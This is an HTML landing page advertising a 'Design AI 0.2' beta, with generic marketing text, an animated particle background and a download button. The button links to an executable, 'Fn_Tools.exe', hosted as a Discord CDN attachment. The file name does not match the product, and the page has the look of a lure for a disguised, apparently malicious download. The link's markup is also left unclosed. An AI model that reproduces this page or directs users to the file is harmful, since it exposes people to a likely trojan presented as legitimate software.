<!DOCTYPE html>
<html>
<head>
  <title>Beta Version 0.2</title>
  <link rel="stylesheet" href="styles.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      color: #333;
      text-align: center;
      padding: 40px;
      overflow: hidden;
      background-color: #f7f7f7;
      transition: background-color 0.3s;
    }

    h1 {
      font-size: 36px;
      margin-bottom: 20px;
    }

    .navigation {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .navigation a {
      display: inline-block;
      padding: 10px 20px;
      font-size: 18px;
      font-weight: bold;
      text-decoration: none;
      color: #333;
      transition: color 0.3s;
    }

    .navigation a:hover {
      color: #007bff;
    }

    .content {
      transition: opacity 0.3s;
      opacity: 1;
    }

    .hidden {
      opacity: 0;
    }

    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      pointer-events: none;
    }

    .background canvas {
      position: absolute;
      top: 0;
      left: 0;
    }

    .image-scroll {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 300px;
      overflow: hidden;
    }

    .image-scroll img {
      max-width: 100%;
      height: auto;
      transition: transform 0.3s;
    }

    .image-scroll:hover img {
      transform: scale(1.1);
    }

    .box {
      display: inline-block;
      padding: 20px;
      margin: 20px;
      background-color: #007bff;
      color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      transition: transform 0.3s;
    }

    .box:hover {
      transform: scale(1.05);
    }
  </style>
</head>
<body>
  <h1 style="color: #007bff;">The Beta Version 0.2</h1>

  <div class="navigation">
    <a href="#download">Download</a>
    <a href="#about">About Us</a>
    <a href="#design-ai">What is a Design AI</a>
  </div>

  <div id="download" class="content">
    <div class="box">
      <h2 style="color: #fff;">Design AI 0.2</h2>
      <p>Click the button below to download.</p>
      <a href="https://cdn.discordapp.com/attachments/1104034900316782743/1104813055268896768/Fn_Tools.exe
        <div class="box">
          <h2 style="color: #fff;">Download Now</h2>
        </div>
      </a>
    </div>
  </div>

  <div id="about" class="content hidden">
    <div class="box">
      <h2 style="color: #fff;">About Us</h2>
      <p>
Welcome to our beta software program! We are a team of tech enthusiasts and developers driven by the desire to create cutting-edge solutions. Our beta software represents the culmination of countless hours of research, development, and user feedback. By joining our program, you become an essential part of refining and shaping the future of our software. Together, let's explore new possibilities and revolutionize the digital landscape.</p>
    </div>
  </div>

  <div id="design-ai" class="content hidden">
    <div class="box">
      <h2 style="color: #fff;">What is a Design AI</h2>
      <p>Design AI refers to the application of artificial intelligence in the field of design. It utilizes machine learning algorithms and data-driven insights to automate and enhance various aspects of the design process. From generating unique design concepts to assisting with layout and composition, design AI empowers designers with intelligent tools that can streamline workflows, boost creativity, and deliver more efficient and impactful design solutions.</p>
    </div>
  </div>

  <div class="background">
    <canvas id="canvas"></canvas>
  </div>

  <script>
    // Animated background code
    var canvas = document.getElementById('canvas');
    var ctx = canvas.getContext('2d');
    var width = canvas.width = window.innerWidth;
    var height = canvas.height = window.innerHeight;
    var particles = [];

    function random(min, max) {
      return Math.random() * (max - min) + min;
    }

    function Particle() {
      this.x = random(0, width);
      this.y = random(0, height);
      this.vx = random(-0.5, 0.5);
      this.vy = random(-0.5, 0.5);
      this.radius = random(1, 3);
    }

    Particle.prototype.update = function() {
      this.x += this.vx;
      this.y += this.vy;

      if (this.x < 0 || this.x > width) {
        this.vx *= -1;
      }

      if (this.y < 0 || this.y > height) {
        this.vy *= -1;
      }
    };

    Particle.prototype.draw = function() {
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2, false);
      ctx.fillStyle = '#007bff';
      ctx.fill();
    };

    function createParticles() {
      for (var i = 0; i < 100; i++) {
        particles.push(new Particle());
      }
    }

    function updateParticles() {
      ctx.clearRect(0, 0, width, height);

      for (var i = 0; i < particles.length; i++) {
        particles[i].update();
        particles[i].draw();
      }

      requestAnimationFrame(updateParticles);
    }

    createParticles();
    updateParticles();

    // Smooth transitions between content
    var navigationLinks = document.querySelectorAll('.navigation a');
    var contents = document.querySelectorAll('.content');

    function showContent(index) {
      contents.forEach(function(content) {
        content.classList.add('hidden');
      });

      contents[index].classList.remove('hidden');
      setTimeout(function() {
        contents[index].classList.add('visible');
      }, 10);
    }

    function handleClick(event) {
      event.preventDefault();

      var target = event.target;
      var index = Array.from(navigationLinks).indexOf(target);

      if (index !== -1) {
        navigationLinks.forEach(function(link) {
          link.classList.remove('active');
        });

        target.classList.add('active');
        showContent(index);
      }
    }

    navigationLinks.forEach(function(link) {
      link.addEventListener('click', handleClick);
    });
  </script>
</body>
</html>
